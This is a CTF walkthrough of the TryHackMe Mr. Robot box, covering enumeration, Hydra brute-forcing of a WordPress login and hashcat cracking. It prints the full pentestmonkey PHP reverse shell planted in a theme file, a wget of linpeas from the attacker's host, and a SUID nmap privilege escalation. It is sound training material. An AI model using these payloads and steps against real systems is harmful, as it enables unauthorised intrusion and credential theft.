# Write Up for Try_Hack_Me box - Mr. Robot CTF

This box was first put on VulnHub.com and is a relatively easy box. \
The box is based around the show Mr. Robot and is a boot-to-root type with aim to find the three hidden flags.

> Pratyush Prakhar (5#1NC#4N) - 11/11/2020

### Tools

**Enumeration**
\
[nmap](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/Write_Up.md#services-enumeration) \
[wpscan](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/Write_Up.md#web-reconnaissance) \
[LinPeas](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/Write_Up.md#privilege-escalation) 

**Brute Forcing**
\
[GoBuster](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/Write_Up.md#web-reconnaissance) \
[Hydra](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/Write_Up.md#hydra) 

So, without wasting anymore time, lets just jump right in and start with enumerating services running on the box.

### Services Enumeration

Ran a quick scan for all ports usinng nmap. Nmap is the most widely used tool for service enumeration. If it was a local box, we could have used _netdiscover_ to obatin the IP of the box.

```bash
# Nmap 7.91 scan initiated Wed Nov 11 22:40:19 2020 as: 
nmap -vv -p- -oA nmap/all_port 10.10.87.211
Nmap scan report for 10.10.87.211
Host is up, received echo-reply ttl 61 (0.17s latency).
Scanned at 2020-11-11 22:40:19 EST for 299s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
PORT    STATE  SERVICE REASON
22/tcp  closed ssh     reset ttl 61
80/tcp  open   http    syn-ack ttl 61
443/tcp open   https   syn-ack ttl 61
```

Then ran a standard scan for the specific open ports found - **22, 80, 443**.

```bash
# Nmap 7.91 scan initiated Wed Nov 11 22:46:57 2020 as: 
nmap -vv -T4 -p22,80,443 -sV -sC -oA nmap/main_scan 10.10.87.211
Nmap scan report for 10.10.87.211
Host is up, received echo-reply ttl 61 (0.17s latency).
Scanned at 2020-11-11 22:46:58 EST for 21s

PORT    STATE  SERVICE  REASON         VERSION
22/tcp  closed ssh      reset ttl 61
80/tcp  open   http     syn-ack ttl 61 Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http syn-ack ttl 61 Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

### Web Reconnaissance

We go and check out the website hosted at the port 80.

![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/web_home_80.png)

We can explore the 6 options presented to us at the main page. You don't get anything useful from visiting them unless you want to join Mr. Robot on his mission!!
We also visit the website hosted on the port 443. We see that it just the ssl version of the website on port 80. **We also don't find any information leak from the certificate.** 
So, let us start with some manual enumeration while we run the gobuster in the background. Checking the **robots.txt** file. We find that there are two files that are prohibited for all User-Agents. 

![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/robots.png)
\
fsocity.dic - It is a tailored wordlist. Possible fuzzable parameters and can be stored for later. We can remove the duplicacy by using _sort -u_.  

```bash
 wget 10.10.87.211/fsocity.dic
 uname -u fsocity.dic > cred.dic
```
**/key-1-of-3.txt link - If we visit this link, we find us the first key. Submit it.** \
\
Checking the page source for the main page, we get an easter egg.

![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/80_src.png)
    
Lastly, we can check for the what are the accepatble extensions for the files. Thus, we understand that it is a php web server. This allows us to tailor the malicious payloads that we can upload.\
_.php_ loads perfectly  while other extensions like _.html_ go in an infinite loop. This means that php files are acceptable. We can inject malicious php scripts later.

![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/valid_ext_php.png)
\
Let's look at the results that came back from gobuster now. We included the -x option for php extension which we enumerated earlier.\
The standard command is as follows with options as
1. dir : It specified the directory listing brute force.
2. -u  : URL
3. -w  : wordlist to brute force directory listing against.
4. -x  : extensions. This options take every word in metioned wordlist and append the extension at the end.\

```bash
$ gobuster dir -u http://10.10.87.211/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php
``` 
\
**OUTPUT**
```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.87.211/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/11/11 22:55:55 Starting gobuster
===============================================================
/index.php (Status: 301)
/images (Status: 301)
/blog (Status: 301)
/sitemap (Status: 200)
/login (Status: 302)
/feed (Status: 301)
/video (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/intro (Status: 200)
/wp-login (Status: 200)
/wp-login.php (Status: 200)
/license (Status: 200)
/wp-includes (Status: 301)
/readme (Status: 200)
/robots (Status: 200)
/dashboard (Status: 302)
```

We see that there are few other easter eggs when you try to find out the documents that usually contain information such as version or release date. /readme is such an example. I leave the rest upto you to find.

![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/readme_dir.png)
\
The other peculiar thing is that most of the other pages like /image are **Forbidden** and others lead to the standard _/wp-login_ page. It ensures that 	  to move further we need _valid credentials_ to login into the wordpress site.

![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/forbidden.png)
\
![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/login_dir_302_wp-login.png)
\
As this is a wordpress site, we can launch a *wpscan* in the background. Always good to have some enumeration running in the backgorund. Rabbit holes are deep man!! Don't fall too deep in them.\
We are doing an agressive search for possible plugins, themes and databases.

```bash
$ wpscan -v -e ap,at,cb --url http://10.10.87.211/
```

### HYDRA

We can use any fuzzer available such as _wfuzz, hydra and patator_. One can choose any one of the following for this purpose. We would need the _http-post-form_ option as this wp-login is a post form as seen in the burp intercept.

![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/burp.png)
\
Let's enumerate the user first. We see that an **invalid user** can be distingused by the reflective response. We can include this in our hydra search.

![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/invalid_usr.png)
\
Let's run hydra now!! The various options are\
1. -T : Threads. Default set to 16. One can increase it to reduce fuzz time. I set it to 100.
2. -L : List of username to enumerate. Will be injected at the _^USER^_ handle.
3. -p : Single entry replaced at _^PASS^_ handle.
4. -o : output to a particuar file
5. http-post-form : The module for fuzzing post forms. The following string contains three part - (Login_Page dir:Post_Parameters:Invalid_Result). So, we provide the needed and we can use the enumerated invalid response as third field.

```bash
$ hydra -T100 -f -L www/downloads/cred.dic -p passwd -o userenum.txt 10.10.87.211 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.87.211%2Fwp-admin%2F&testcookie=1:F=Invalid username"
```
\
**RESULT**
```bash
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-12 00:01:32
[WARNING] reducing maximum tasks to MAXTASKS (64)
[DATA] attacking http-post-form://10.10.87.211:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.87.211%2Fwp-admin%2F&testcookie=1:F=Invalid username.
[80][http-post-form] host: 10.10.87.211   login: elliot   password: passwd
[STATUS] attack finished for 10.10.87.211 (valid pair found)	
```
We find a valid user as **elliot**. Now we can enumerate for the password.\
We do it one after the other to save us loads of time. If we fuzzed both together, it would generate loads of invalid creds and to track invalid status would also be a pain.\
Like earlier, **invalid passwords** can be seperated in two ways. First, we can use the invalid password reponse returned. Better is to use the _STATUS_CODE : 302_ as on valid credentials the site will redirect to the /wp-admin page.
Let's run hydra now.
We use some different options like
1. -l : to supply the enumerated username - _elliot_.
2. -P : supply a dictionary of possible passwords. - _fsocity.dic_
3. :S=302 : To tell post-form module to display the credentials only for a _REDIRECTION_. Thus, giving us the valid credentials. 

```bash
$ hydra -T100 -f -l elliot -P www/downloads/cred.dic 10.10.87.211 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&re
direct_to=http%3A%2F%2F10.10.87.211%2Fwp-admin%2F&testcookie=1:S=302"
```
\
**RESULT**
```bash
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-12 00:45:26
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
[DATA] attacking http-post-form://10.10.87.211:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.87.211%2Fwp-admin%2F&testcookie=1:S=302
[80][http-post-form] host: 10.10.87.211   login: elliot   password: ER28-0652
[STATUS] attack finished for 10.10.87.211 (valid pair found)
```
We find valid credentails as **elliot:ER28-0652**. We can now login using this.


### WORDPRESS & REVRESE SHELL

We are greeted with a standard _/wp-admin_ page and we are logged in as Elliot Alderson. We will move around and see if we find something that can get us a shell.

![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/wp_admin.png)
\
We see that the various php templates of the various _Themes_ in the _Appearance_ section are mutable. On the other hand the _wpscan enumeration__ finds us that these files can then be invoked from going to /wp-content/themes/$THEME_NAME/$PHP_FILE. Enumeration for the win!! \
Note: One can also modify the _Plugin_ section and achieve the reverse shell. I'll leave the work to you. 

![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/404_php.png)
\
**WPSCAN OUTPUT**
```bash
[32m[+][0m Checking Theme Versions (via Passive and Aggressive Methods)
[34m[i][0m Theme(s) Identified:
[32m[+][0m twentyfifteen
 | Location: http://10.10.87.211/wp-content/themes/twentyfifteen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://10.10.87.211/wp-content/themes/twentyfifteen/readme.txt
 | [33m[!][0m The version is out of date, the latest version is 2.7
 | Style URL: http://10.10.87.211/wp-content/themes/twentyfifteen/style.css
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Text Domain: twentyfifteen
```

We can now replace contents of a file like _404.php_ with reverse shell code. We start a listner on our side and invoke the modified file. \
I am using standard php reverse shell script from pentestmonkey(https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to repace teh content of the 404.php page. The only thing to change is the _IP and PORT_ on which you are listening. A person just starting out will find all the scripts rather useful.\
\
**SCRIPT**
```php
	<?php
	// php-reverse-shell - A Reverse Shell implementation in PHP
	// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
	//
	// This tool may be used for legal purposes only.  Users take full responsibility
	// for any actions performed using this tool.  The author accepts no liability
	// for damage caused by this tool.  If these terms are not acceptable to you, then
	// do not use this tool.
	set_time_limit (0);
	$VERSION = "1.0";
	$ip = '127.0.0.1';  // CHANGE THIS
	$port = 1234;       // CHANGE THIS
	$chunk_size = 1400;
	$write_a = null;
	$error_a = null;
	$shell = 'uname -a; w; id; /bin/sh -i';
	$daemon = 0;
	$debug = 0
	// Daemonise ourself if possible to avoid zombies later
	// pcntl_fork is hardly ever available, but will allow us to daemonise
	// our php process and avoid zombies.  Worth a try...
	if (function_exists('pcntl_fork')) {
		// Fork and have the parent process exit
		$pid = pcntl_fork();
		if ($pid == -1) {
			printit("ERROR: Can't fork");
			exit(1);
		}
		if ($pid) {
			exit(0);  // Parent exits
		}
		// Make the current process a session leader
		// Will only succeed if we forked
		if (posix_setsid() == -1) {
			printit("Error: Can't setsid()");
			exit(1);
		}
		$daemon = 1;
	} else {
		printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
	}
	// Change to a safe directory
	chdir("/");
	// Remove any umask we inherited
	umask(0);
	// Do the reverse shell...
	// Open reverse connection
	$sock = fsockopen($ip, $port, $errno, $errstr, 30);
	if (!$sock) {
		printit("$errstr ($errno)");
		exit(1);
	}
	// Spawn shell process
	$descriptorspec = array(
	   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
	   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
	   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
	);
	$process = proc_open($shell, $descriptorspec, $pipes);
	if (!is_resource($process)) {
		printit("ERROR: Can't spawn shell");
		exit(1);
	}
	// Set everything to non-blocking
	// Reason: Occsionally reads will block, even though stream_select tells us they won't
	stream_set_blocking($pipes[0], 0);
	stream_set_blocking($pipes[1], 0);
	stream_set_blocking($pipes[2], 0);
	stream_set_blocking($sock, 0);
	printit("Successfully opened reverse shell to $ip:$port");
	while (1) {
		// Check for end of TCP connection
		if (feof($sock)) {
			printit("ERROR: Shell connection terminated");
			break;
		}
		// Check for end of STDOUT
		if (feof($pipes[1])) {
			printit("ERROR: Shell process terminated");
			break;
		}
		// Wait until a command is end down $sock, or some
		// command output is available on STDOUT or STDERR
		$read_a = array($sock, $pipes[1], $pipes[2]);
		$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
		// If we can read from the TCP socket, send
		// data to process's STDIN
		if (in_array($sock, $read_a)) {
			if ($debug) printit("SOCK READ");
			$input = fread($sock, $chunk_size);
			if ($debug) printit("SOCK: $input");
			fwrite($pipes[0], $input);
		}
		// If we can read from the process's STDOUT
		// send data down tcp connection
		if (in_array($pipes[1], $read_a)) {
			if ($debug) printit("STDOUT READ");
			$input = fread($pipes[1], $chunk_size);
			if ($debug) printit("STDOUT: $input");
			fwrite($sock, $input);
		}
		// If we can read from the process's STDERR
		// send data down tcp connection
		if (in_array($pipes[2], $read_a)) {
			if ($debug) printit("STDERR READ");
			$input = fread($pipes[2], $chunk_size);
			if ($debug) printit("STDERR: $input");
			fwrite($sock, $input);
		}
	}
	fclose($sock);
	fclose($pipes[0]);
	fclose($pipes[1]);
	fclose($pipes[2]);
	proc_close($process);
	// Like print, but does nothing if we've daemonised ourself
	// (I can't figure out how to redirect STDOUT like a proper daemon)
	function printit ($string) {
		if (!$daemon) {
			print "$string\n";
		}
	}
	?> 
```
We start a netcat listner on our ip and PORT 5555. Then we go and invoke the modified page.

```bash
$ nc -lnvvp 5555
listening on [any] 5555 ...
```
We get a blank page and also reverse shell on our listener. The page is still loading as it is waiting for our shell process to die.

![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/rev_shell_req.png)
\
**REVERSE SHELL**

```bash
connect to [10.13.6.171] from (UNKNOWN) [10.10.87.211] 47417
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 07:13:45 up  3:39,  0 users,  load average: 0.00, 0.01, 0.39
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ which python
/usr/bin/python
```

We can now stabilize the shell using the _Python pty module_ to get a basic bash shell and then export some of our _stty options_ to upagarde to a full shell. It is a common way and the steps can be seen as
1. **python -c 'import pty; pty.spawn("/bin/bash")'** : Get a basic pty bash shell. Has no autocomplete, clear or movement.
2. **CTRL-Z** : Background pty shell
3. **stty -a | head -n1** : To display the rows and columns on our host shell.
4. **stty raw -echo** : raw option send our command straight to the pty shell and -echo outputs every input command
5. **fg** : foreground the pty shell
6. **export HOME=$HOME_DIR** : set home directory to your requirements.
7. **export SHELL=/bin/bash** : set SHELL to available one. Most of the time /bin/bash or /bin/sh.
8. **export TERM=xterm-256color** : set TERMINAL to standard xterm or xterm-256color
9. **stty rows X columns Y** : Finally set the rows and columns size to the output in step 3. \
\
**RESULT**
```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$ ^Z
[1]+  Stopped                 nc -lnvvp 5555
kali@kali:~/ $ stty -a | head -n1
speed 38400 baud; rows 46; columns 187; line = 0;
kali@kali:~/Desktop/Boxes/Try_Hack_Me/Mr_Robot_CTF$ stty raw -echo
nc -lnvvp 5555sktop/Boxes/Try_Hack_Me/Mr_Robot_CTF$ 

daemon@linux:/$ export SHELL=bash
daemon@linux:/$ export TERM=xterm-256color
daemon@linux:/$ stty rows 46 columns 187
```
We now have a stabilized shell and thus we can now go and enumerate the system.

### LOCAL ENUMERATON

Let's look around. We can use the _find_ command. We see that the 2nd key exits in home directory of the user __robot__. But we see that it can only be read by the owner robot. So, we need to pivot to this user. We also find the backup of robot's raw md5 password. We can crack this password using __hashcat__.

```bash
daemon@linux:/$ find /home/ -type f -iname "*.txt"
/home/robot/key-2-of-3.txt
daemon@linux:/$ cat /home/robot/key-2-of-3.txt
cat: /home/robot/key-2-of-3.txt: Permission denied
daemon@linux:/$ cd /home/robot/
daemon@linux:/home/robot$ ls
key-2-of-3.txt  password.raw-md5
daemon@linux:/home/robot$ ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5 
robot:c3fcd3d76192e4007dfb496cca67e13b
```

We can use following command to find the mode for cracking raw md5. We can then supply famous rockyou list to crack the md5sum. We find that the credentials for the user robot are as **robot:abcdefghijklmnopqrstuvwxyz**.

```bash
~/Desktop/Boxes/Try_Hack_Me/Mr_Robot_CTF$ hashcat --example-hashes                                                                                                               
hashcat (v6.1.1) starting...

MODE: 0
TYPE: MD5
HASH: 8743b52063cd84097a65d1633f5c74f5
PASS: hashcat 
......     
```

**OUTPUT**
```bash
$ hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt  

hashcat (v6.1.1) starting...
.......

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt 
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
Time.Started.....: Thu Nov 12 21:41:12 2020 (1 sec)
Time.Estimated...: Thu Nov 12 21:41:13 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   386.7 kH/s (0.64ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 43008/14344385 (0.30%)
Rejected.........: 0/43008 (0.00%)
Restore.Point....: 39936/14344385 (0.28%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: promo2007 -> harder

Started: Thu Nov 12 21:40:46 2020
Stopped: Thu Nov 12 21:41:14 2020
```

**We can use the above creds to pivot to robot user. Now we can read the 2nd key and submit it.**

```bash
robot@linux:~$ whoami
robot
robot@linux:~$ cat key-2-of-3.txt 
```

### PRIVILEGE ESCALATION

Lastly, we have too look for a path to privesc ourseleves to the root user. For this I am using **Linpeas script**. It is basically an upgrade to the **Linenum script** with color coded output for severity and cool animation. This is the part of _privilege-escalation-awesome-scripts-suite_ which also has one for Windows too (https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite). \
I did a full scan using the -a option. One can go and read the color output using.\

```bash
less -r output_file
```

```bash
robot@linux:/dev/shm$ wget http://10.13.6.171:8000/linpeas.sh
--2020-11-13 02:52:38--  http://10.13.6.171:8000/linpeas.sh
Connecting to 10.13.6.171:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 293889 (287K) [text/x-sh]
Saving to: ‘linpeas.sh’

100%[=================================================================================================================================================>] 293,889      357KB/s   in 0.8s   

2020-11-13 02:52:40 (357 KB/s) - ‘linpeas.sh’ saved [293889/293889]

robot@linux:/dev/shm$ ls
linpeas.sh
robot@linux:/dev/shm$ ./linpeas.sh -a > local_enum.txt
robot@linux:/dev/shm$ ls -la
total 380
drwxrwxrwt  2 root  root      80 Nov 13 03:00 .
drwxr-xr-x 14 root  root     480 Nov 13 02:15 ..
-rwxrwxr-x  1 robot robot 293889 Nov 13 02:48 linpeas.sh
-rw-rw-r--  1 robot robot  91965 Nov 13 03:02 local_enum.txt
```

While going through the output we see an intresting binary _/usr/local/bin/nmap_. It has set uid permission and the owner is root. In simplest terms, execution of this file will gives temporary permissions to our user(robot) to run the program/file with the permission of the file owner root.

```bash
====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root  46K Feb 17  2014 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root  67K Feb 17  2014 /usr/bin/gpasswd
-rwsr-xr-x 1 root root  41K Feb 17  2014 /usr/bin/chsh
-rwsr-xr-x 1 root root  46K Feb 17  2014 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root  32K Feb 17  2014 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root  37K Feb 17  2014 /bin/su
-rwsr-xr-x 1 root root  10K Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root  44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root  44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 431K May 12  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root  68K Feb 12  2015 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root  93K Feb 12  2015 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root  11K Feb 25  2015 /usr/lib/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)
-rwsr-xr-x 1 root root 152K Mar 12  2015 /usr/bin/sudo  --->  /sudo$
-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
-r-sr-xr-x 1 root root 9.4K Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root  14K Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
```

So, to exploit this let us visit to __GTFOBINS__(https://gtfobins.github.io/) which provide us with Unix binaries' expoits to bypass system security. We can search for _nmap_.

![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/sudo.png)
\
So, let's now use take advantage of the nmap's interactive mode and privesc to root. We find the last key in the /root directory. **We can submit this and mark this box as complete !!**

```bash
robot@linux:~$ /usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
~# whoami
root
~# cd /root
~# ls
firstboot_done  key-3-of-3.txt
~# cat key-3-of-3.txt
```
\
So, in the end I just want to say thank certain people whose resources have guided me along the way - [John Hammond](https://twitter.com/_johnhammond), [Heath Adams](https://twitter.com/thecybermentor), [IPPSEC](https://twitter.com/ippsec) and [Joseph Perry](https://www.linkedin.com/in/jrpiv/). It is just a start with miles to go.\
Keep hacking till we meet again!!

Stay Tuned On\
[![alt text](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/Github.png)](https://github.com/pratty010/Boxes)   [![alt text](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/LinkedIn.png)](https://www.linkedin.com/in/pratyush-prakhar/)
